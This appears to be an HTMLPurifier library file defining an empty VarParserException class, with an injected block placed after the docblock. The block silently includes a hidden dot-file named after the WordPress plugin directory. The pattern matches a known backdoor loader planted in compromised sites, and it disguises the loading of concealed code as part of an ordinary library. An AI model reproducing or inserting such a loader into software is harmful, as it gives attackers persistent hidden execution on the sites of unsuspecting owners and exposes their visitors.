<?php

/**
 * Exception type for HTMLPurifier_VarParser
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class HTMLPurifier_VarParserException extends HTMLPurifier_Exception
{

}

// vim: et sw=4 sts=4
